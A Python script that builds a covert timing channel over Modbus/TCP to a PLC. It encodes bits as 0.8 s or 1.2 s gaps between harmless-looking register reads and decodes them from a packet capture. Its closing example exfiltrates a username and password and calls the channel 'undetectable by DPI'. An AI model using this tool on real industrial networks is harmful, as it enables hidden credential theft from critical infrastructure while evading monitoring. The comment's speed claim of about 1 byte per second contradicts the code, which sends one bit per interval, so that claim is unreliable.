# timing_covert_channel.py - Encode data in operation timing
import time

class TimingCovertChannel:
    def __init__(self, plc_ip):
        self.plc_ip = plc_ip
        self.base_delay = 1.0  # Base interval (seconds)

    def send_data(self, data):
        """
        Encode data in timing intervals between Modbus requests
        - Short delay (0.8s) = bit '0'
        - Long delay (1.2s) = bit '1'
        """
        from pymodbus.client import ModbusTcpClient
        client = ModbusTcpClient(self.plc_ip)
        client.connect()

        # Convert data to binary
        binary_data = ''.join(format(ord(c), '08b') for c in data)

        for bit in binary_data:
            # Send benign Modbus read request
            client.read_holding_registers(0, 10)

            # Encode bit in delay before next request
            if bit == '0':
                time.sleep(self.base_delay - 0.2)  # 0.8s
            else:
                time.sleep(self.base_delay + 0.2)  # 1.2s

        client.close()
        print(f"[+] Transmitted {len(data)} bytes via timing channel")
        print(f"[+] Transfer time: {len(binary_data) * self.base_delay:.1f} seconds")

    def receive_data(self, pcap_file):
        """
        Decode data from packet capture (passive analysis)
        Analyst sees "normal" Modbus polling
        """
        from scapy.all import rdpcap, TCP

        packets = rdpcap(pcap_file)
        timestamps = []

        # Extract Modbus request timestamps
        for pkt in packets:
            if pkt.haslayer(TCP) and pkt[TCP].dport == 502:
                timestamps.append(float(pkt.time))

        # Decode timing deltas
        binary_data = ""
        for i in range(1, len(timestamps)):
            delta = timestamps[i] - timestamps[i-1]

            if 0.7 < delta < 0.9:  # Short delay -> '0'
                binary_data += '0'
            elif 1.1 < delta < 1.3:  # Long delay -> '1'
                binary_data += '1'

        # Binary to ASCII
        decoded = ""
        for i in range(0, len(binary_data), 8):
            byte = binary_data[i:i+8]
            if len(byte) == 8:
                decoded += chr(int(byte, 2))

        return decoded

# Example: Exfiltrate credentials via timing channel
timing_channel = TimingCovertChannel("192.168.1.10")
timing_channel.send_data("admin:P@ssw0rd123")
# Extremely slow (~1 byte per second) but undetectable by DPI
